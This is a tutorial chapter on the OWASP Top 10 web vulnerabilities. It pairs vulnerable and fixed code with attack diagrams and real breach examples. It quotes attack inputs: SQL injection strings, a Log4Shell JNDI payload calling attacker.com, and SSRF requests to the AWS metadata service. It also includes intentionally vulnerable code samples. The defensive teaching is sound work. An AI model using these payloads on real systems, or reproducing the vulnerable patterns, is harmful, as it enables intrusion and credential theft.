# OWASP Top 10 — Most Common Security Vulnerabilities

> **What you'll learn**: The ten most critical security risks in web applications as identified by OWASP, how each attack works, and how to defend against them with real code examples.

---

## Real-Life Analogy

Think of your web application as a **house**. The OWASP Top 10 is like a **home security checklist** from expert burglars who tell you: "Here are the 10 ways we most commonly break into houses."

```
┌─────────────────────────────────────────────────────────────┐
│                    YOUR WEB APP = A HOUSE                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  #1  Broken Access Control    = Doors that don't lock        │
│  #2  Cryptographic Failures   = Writing secrets on windows   │
│  #3  Injection                = Mailbox that runs commands   │
│  #4  Insecure Design          = House built without locks    │
│  #5  Security Misconfiguration= Leaving keys under doormat   │
│  #6  Vulnerable Components    = Rusty locks with known picks │
│  #7  Auth Failures            = Anyone can claim to be owner │
│  #8  Data Integrity Failures  = Accepting unverified packages│
│  #9  Logging Failures         = No security cameras          │
│  #10 SSRF                     = Tricking you to unlock doors │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Core Concept Explained Step-by-Step

### What is OWASP?

**OWASP** (Open Web Application Security Project) is a nonprofit organization that publishes free security guides. Their **Top 10** list is updated every few years and represents the most critical web application security risks based on real-world data from hundreds of organizations.

The 2021 OWASP Top 10 (current as of writing):

```
┌────┬──────────────────────────────────┬────────────────────────┐
│ #  │ Vulnerability                    │ Impact                 │
├────┼──────────────────────────────────┼────────────────────────┤
│ 1  │ Broken Access Control            │ Unauthorized data access│
│ 2  │ Cryptographic Failures           │ Data exposure           │
│ 3  │ Injection (SQL, NoSQL, OS, LDAP) │ Full system compromise │
│ 4  │ Insecure Design                  │ Fundamental flaws       │
│ 5  │ Security Misconfiguration        │ Easy exploitation       │
│ 6  │ Vulnerable & Outdated Components │ Known exploits          │
│ 7  │ Identification & Auth Failures   │ Account takeover        │
│ 8  │ Software & Data Integrity Failures│ Supply chain attacks   │
│ 9  │ Security Logging & Monitoring    │ Undetected breaches     │
│ 10 │ Server-Side Request Forgery      │ Internal network access │
└────┴──────────────────────────────────┴────────────────────────┘
```

---

## #1: Broken Access Control

**What it is:** Users can access data or perform actions they shouldn't be allowed to.

```
ATTACK SCENARIO:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  Normal user (Bob) is viewing his profile:                │
│  GET /api/users/42/profile  → Bob's profile ✓            │
│                                                           │
│  Bob changes the URL:                                     │
│  GET /api/users/1/profile   → Admin's profile! 😱         │
│                                                           │
│  This is called IDOR (Insecure Direct Object Reference)   │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Vulnerable Code (Python):**
```python
# ❌ BAD — No authorization check!
@app.route("/api/users/<int:user_id>/profile")
def get_profile(user_id):
    return db.query(f"SELECT * FROM users WHERE id = {user_id}")
```

**Fixed Code (Python):**
```python
# ✓ GOOD — Check ownership
@app.route("/api/users/<int:user_id>/profile")
@login_required
def get_profile(user_id):
    current_user = get_current_user()
    # Authorization check: can only view YOUR profile (or admin)
    if current_user.id != user_id and "admin" not in current_user.roles:
        abort(403)  # Forbidden
    return db.query("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

## #2: Cryptographic Failures

**What it is:** Sensitive data exposed due to weak or missing encryption.

```
EXAMPLES:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  • Passwords stored in plain text or MD5                  │
│  • Credit cards transmitted over HTTP                     │
│  • Using DES/3DES instead of AES-256                     │
│  • Hardcoded encryption keys in source code              │
│  • Not encrypting database backups                        │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Vulnerable Code (Java):**
```java
// ❌ BAD — MD5 is broken, no salt!
String hash = MessageDigest.getInstance("MD5")
    .digest(password.getBytes()).toString();
```

**Fixed Code (Java):**
```java
// ✓ GOOD — bcrypt with work factor
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);  // Salted + slow hash
boolean matches = encoder.matches(inputPassword, storedHash);
```

---

## #3: Injection

**What it is:** Untrusted data is sent to an interpreter as part of a command, tricking it into executing unintended commands.

```
SQL INJECTION ATTACK:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  Login form:                                              │
│    Username: admin' OR '1'='1' --                         │
│    Password: anything                                     │
│                                                           │
│  Vulnerable query becomes:                                │
│    SELECT * FROM users                                    │
│    WHERE username = 'admin' OR '1'='1' --'                │
│    AND password = 'anything'                              │
│                                                           │
│  '1'='1' is always true! The -- comments out the rest!    │
│  Result: Attacker logs in as admin without password! 😱    │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Vulnerable Code (Python):**
```python
# ❌ BAD — String concatenation = SQL Injection!
username = request.form["username"]
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)  # If username = "'; DROP TABLE users; --" → 💥
```

**Fixed Code (Python):**
```python
# ✓ GOOD — Parameterized query (prepared statement)
username = request.form["username"]
cursor.execute(
    "SELECT * FROM users WHERE username = %s",  # Placeholder
    (username,)  # Parameter — NEVER interpolated into SQL
)
```

**Fixed Code (Java):**
```java
// ✓ GOOD — PreparedStatement
String username = request.getParameter("username");
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"  // Placeholder
);
stmt.setString(1, username);  // Safely bound
ResultSet rs = stmt.executeQuery();
```

---

## #4: Insecure Design

**What it is:** Fundamental flaws in the architecture/design that can't be fixed by implementation alone.

```
EXAMPLE: No rate limiting on password reset
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  Attacker: POST /reset-password {email: "victim@..."     │
│            for every possible 4-digit code (0000-9999)    │
│                                                           │
│  If no rate limiting + short code = Account takeover!     │
│                                                           │
│  FIX: Rate limit + longer codes + account lockout         │
│       + exponential backoff                               │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Design-level fixes:**
- Threat modeling during design phase
- Abuse case stories alongside user stories
- Rate limiting on all sensitive endpoints
- Business logic validation (e.g., can't buy more items than in stock)

---

## #5: Security Misconfiguration

**What it is:** Default configurations, unnecessary features enabled, missing security headers.

```
COMMON MISCONFIGURATIONS:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  • Default admin credentials (admin/admin)               │
│  • Debug mode enabled in production                       │
│  • Directory listing enabled on web server               │
│  • Stack traces shown to users                           │
│  • Unnecessary ports open (22, 3306, 5432 to internet)   │
│  • Missing security headers (HSTS, CSP, X-Frame-Options) │
│  • Sample applications still deployed                     │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Fix — Security Headers (Nginx):**
```nginx
# Add these to every response
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

---

## #6: Vulnerable and Outdated Components

**What it is:** Using libraries, frameworks, or dependencies with known security vulnerabilities.

```
REAL-WORLD EXAMPLE: Log4Shell (CVE-2021-44228)
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  Library: Apache Log4j 2 (Java logging)                   │
│  Impact: Remote Code Execution (RCE)                      │
│  Affected: Millions of Java applications worldwide        │
│                                                           │
│  Attack: Send this in any logged field (User-Agent, etc.)│
│          ${jndi:ldap://attacker.com/exploit}              │
│                                                           │
│  Result: Server downloads and executes attacker's code!   │
│                                                           │
│  Fix: Update Log4j to 2.17.0+                            │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Prevention:**
```bash
# Scan Python dependencies for vulnerabilities
pip install safety
safety check --full-report

# Scan Node.js dependencies
npm audit

# Scan Java dependencies (using OWASP Dependency-Check)
mvn org.owasp:dependency-check-maven:check

# Automated scanning with GitHub Dependabot or Snyk
```

---

## #7: Identification and Authentication Failures

**What it is:** Weaknesses in authentication mechanisms that allow attackers to compromise passwords, keys, or session tokens.

```
ATTACK SCENARIOS:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  • Credential stuffing (using leaked password lists)      │
│  • Brute force (trying all combinations)                  │
│  • Session fixation (forcing a known session ID)          │
│  • No account lockout after failed attempts               │
│  • Weak password requirements                             │
│  • Password in URL parameters (?password=...)             │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Fix — Account Lockout + Rate Limiting (Python):**
```python
# Rate-limited login with account lockout
from flask_limiter import Limiter

limiter = Limiter(app, default_limits=["100 per hour"])

failed_attempts = {}  # In production, use Redis

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    username = request.json["username"]
    
    # Check if account is locked
    attempts = failed_attempts.get(username, 0)
    if attempts >= 5:
        return jsonify({"error": "Account locked. Try again in 15 minutes."}), 429
    
    if not verify_credentials(username, request.json["password"]):
        failed_attempts[username] = attempts + 1
        # Don't reveal whether username exists!
        return jsonify({"error": "Invalid credentials"}), 401
    
    failed_attempts.pop(username, None)  # Reset on success
    return create_session(username)
```

---

## #8: Software and Data Integrity Failures

**What it is:** Code and infrastructure that doesn't verify integrity of updates, CI/CD pipelines, or deserialized data.

```
ATTACK SCENARIOS:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  • Supply chain attacks (compromised npm/pip packages)    │
│  • Insecure deserialization (executing malicious objects) │
│  • CI/CD pipeline compromise (injecting malicious code)  │
│  • Auto-update without signature verification             │
│                                                           │
│  Example: SolarWinds hack (2020)                          │
│  Attackers compromised the build pipeline and injected    │
│  malware into software updates sent to 18,000 customers  │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Fix — Verify Package Integrity:**
```bash
# Python: Use hash verification
pip install --require-hashes -r requirements.txt

# requirements.txt with hashes:
# flask==2.3.0 --hash=sha256:abcdef1234567890...

# npm: Use lockfiles and integrity checks
npm ci  # Uses package-lock.json (not npm install!)

# Docker: Pin exact image digests
FROM python:3.11@sha256:abc123...  # Not just python:3.11
```

---

## #9: Security Logging and Monitoring Failures

**What it is:** Insufficient logging, monitoring, and alerting that allows attacks to go undetected.

```
WHAT SHOULD BE LOGGED:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  ✓ All authentication attempts (success and failure)      │
│  ✓ Authorization failures (403s)                          │
│  ✓ Input validation failures                              │
│  ✓ Server errors (500s)                                   │
│  ✓ Admin actions (user creation, role changes)            │
│  ✓ Data exports and bulk operations                       │
│                                                           │
│  ✗ NEVER log passwords, tokens, credit card numbers       │
│  ✗ NEVER log PII in plain text                            │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Security Logging (Python):**
```python
import logging
import json
from datetime import datetime

security_logger = logging.getLogger("security")

def log_security_event(event_type, user, details, severity="INFO"):
    """Log security events in structured format for SIEM"""
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,
        "user": user,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "severity": severity,
        "details": details,
    }
    security_logger.info(json.dumps(event))

# Usage
log_security_event("LOGIN_FAILED", "alice", 
    {"reason": "invalid_password", "attempt": 3}, "WARNING")
log_security_event("AUTHZ_DENIED", "bob",
    {"resource": "/admin", "required_role": "admin"}, "WARNING")
```

---

## #10: Server-Side Request Forgery (SSRF)

**What it is:** Attacker tricks the server into making requests to unintended locations (internal services, cloud metadata).

```
SSRF ATTACK:
┌──────────────────────────────────────────────────────────┐
│                                                           │
│  Normal: User asks server to fetch a URL (e.g., preview) │
│  POST /fetch-url {"url": "https://example.com/page"}     │
│                                                           │
│  Attack: User asks server to fetch internal resources!    │
│  POST /fetch-url {"url": "http://169.254.169.254/..."}   │
│                                                           │
│  169.254.169.254 = AWS metadata service                   │
│  Returns: IAM credentials, secrets, tokens! 😱            │
│                                                           │
│  Or: {"url": "http://localhost:6379/"}  → Access Redis!   │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

**Vulnerable Code:**
```python
# ❌ BAD — No URL validation
@app.route("/preview")
def preview():
    url = request.args.get("url")
    response = requests.get(url)  # Fetches ANYTHING, including internal!
    return response.text
```

**Fixed Code:**
```python
# ✓ GOOD — URL validation and allowlist
from urllib.parse import urlparse
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # AWS metadata
    ipaddress.ip_network("127.0.0.0/8"),     # Localhost
]

def is_safe_url(url):
    """Validate URL is not targeting internal resources"""
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        return not any(ip in network for network in BLOCKED_RANGES)
    except (socket.gaierror, ValueError):
        return False

@app.route("/preview")
def preview():
    url = request.args.get("url")
    if not is_safe_url(url):
        abort(400, "URL not allowed")
    response = requests.get(url, timeout=5)
    return response.text
```

---

## How It Works Internally — Attack Flow Diagrams

### SQL Injection — Full Attack Flow

```
┌────────┐          ┌────────────┐          ┌──────────┐
│Attacker│          │ Web Server │          │ Database │
└───┬────┘          └─────┬──────┘          └────┬─────┘
    │                     │                      │
    │ POST /login         │                      │
    │ username: ' OR 1=1--│                      │
    │ password: x         │                      │
    │────────────────────▶│                      │
    │                     │                      │
    │                     │ Builds query:        │
    │                     │ "SELECT * FROM users │
    │                     │  WHERE user=''       │
    │                     │  OR 1=1--'           │
    │                     │  AND pass='x'"       │
    │                     │                      │
    │                     │ Execute query         │
    │                     │─────────────────────▶│
    │                     │                      │
    │                     │ Returns ALL users!    │
    │                     │◀─────────────────────│
    │                     │                      │
    │ 200 OK (logged in   │                      │
    │  as first user =    │                      │
    │  usually admin!)    │                      │
    │◀────────────────────│                      │
```

### SSRF — Cloud Metadata Attack

```
┌────────┐     ┌───────────┐     ┌────────────────────┐
│Attacker│     │ Your App  │     │ AWS Metadata       │
│        │     │ (on EC2)  │     │ 169.254.169.254    │
└───┬────┘     └─────┬─────┘     └─────────┬──────────┘
    │                │                      │
    │ POST /fetch    │                      │
    │ url=http://    │                      │
    │ 169.254.169.254│                      │
    │ /latest/meta-  │                      │
    │ data/iam/...   │                      │
    │───────────────▶│                      │
    │                │                      │
    │                │ GET /latest/meta-data │
    │                │ /iam/security-       │
    │                │ credentials/role     │
    │                │─────────────────────▶│
    │                │                      │
    │                │ {AccessKeyId: ...,   │
    │                │  SecretKey: ...,     │
    │                │  Token: ...}         │
    │                │◀─────────────────────│
    │                │                      │
    │ AWS credentials│                      │
    │ returned! 😱   │                      │
    │◀───────────────│                      │
    │                │                      │
    │ Now attacker has full AWS access!     │
```

---

## Infrastructure Examples

### Automated Vulnerability Scanning Pipeline

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      # Dependency vulnerability check
      - name: Check dependencies
        run: |
          pip install safety
          safety check -r requirements.txt
          
      # Static analysis (SAST)
      - name: Run Bandit (Python SAST)
        run: |
          pip install bandit
          bandit -r src/ -f json -o bandit-report.json
          
      # Container scanning
      - name: Scan Docker image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'my-app:latest'
          severity: 'CRITICAL,HIGH'
          
      # OWASP ZAP (DAST)
      - name: Dynamic security scan
        uses: zaproxy/action-full-scan@v0.4.0
        with:
          target: 'https://staging.example.com'
```

---

## Real-World Example

### Equifax Breach (2017) — OWASP #6 in Action
- **Vulnerability:** Apache Struts with known CVE (2 months unpatched)
- **Impact:** 147 million people's SSN, DOB, addresses exposed
- **Root cause:** Vulnerable component + no patching process
- **Cost:** $1.4 billion+

### Capital One Breach (2019) — OWASP #10 (SSRF)
- **Vulnerability:** SSRF in WAF configuration
- **Attack:** Attacker exploited SSRF to access AWS metadata → IAM credentials
- **Impact:** 100 million customer records
- **Fix:** IMDSv2 (requires token-based access to metadata)

---

## Common Mistakes / Pitfalls

| Mistake | OWASP Category | Impact |
|---------|---------------|--------|
| `f"SELECT * FROM users WHERE id={input}"` | #3 Injection | Full DB compromise |
| Not checking if user owns the resource | #1 Broken Access Control | Data leak |
| Using `MD5` or `SHA1` for passwords | #2 Crypto Failures | Mass account compromise |
| Running `DEBUG=True` in production | #5 Misconfiguration | Information disclosure |
| Never updating dependencies | #6 Vulnerable Components | Known exploit chains |
| Not logging failed logins | #9 Logging Failures | Undetected attacks |
| Fetching user-provided URLs without validation | #10 SSRF | Internal network access |

---

## When to Use / When NOT to Use

OWASP Top 10 should **always** be considered — it's not optional. But prioritize based on your app:

| App Type | Top Priorities |
|----------|---------------|
| E-commerce | #1 (access control), #2 (crypto), #3 (injection) |
| SaaS/Multi-tenant | #1 (access control), #4 (insecure design), #7 (auth) |
| API-only service | #1, #3 (injection), #10 (SSRF) |
| Internal tools | #5 (misconfiguration), #6 (components), #7 (auth) |
| Financial apps | ALL of them, plus compliance (PCI-DSS, SOC2) |

---

## Key Takeaways

- **Broken Access Control** (#1) is the most common vulnerability — always verify authorization server-side
- **Never concatenate user input into queries** — use parameterized queries to prevent injection
- **Keep dependencies updated** — automated scanning catches known vulnerabilities before attackers do
- **Encrypt sensitive data** at rest and in transit — use modern algorithms (AES-256, bcrypt)
- **Log security events** and set up alerts — you can't fix what you can't see
- **Validate all URLs** before server-side fetching to prevent SSRF
- The OWASP Top 10 isn't a checklist to complete once — it's a continuous security practice

---

## What's Next?

Next, we'll deep-dive into three of the most common web security attacks: **CORS, CSRF, and XSS** — how they work, why browsers have built-in protections, and how to properly defend against them. That's Chapter 14.6.
